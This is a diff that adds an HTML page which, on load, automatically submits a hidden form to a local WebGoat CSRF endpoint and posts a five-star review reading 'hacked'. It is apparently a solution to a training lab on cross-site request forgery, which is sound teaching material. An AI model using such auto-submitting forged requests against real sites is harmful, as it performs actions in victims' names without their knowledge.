@@ -1,0 +1,9 @@
+<html>
+  <body>
+    <form action="http://localhost:8080/WebGoat/csrf/review" method="POST">
+      <input type="hidden" name="reviewText" value="hacked">
+      <input type="hidden" name="stars" value="5">
+    </form>
+    <script>document.forms[0].submit();</script>
+  </body>
+</html>
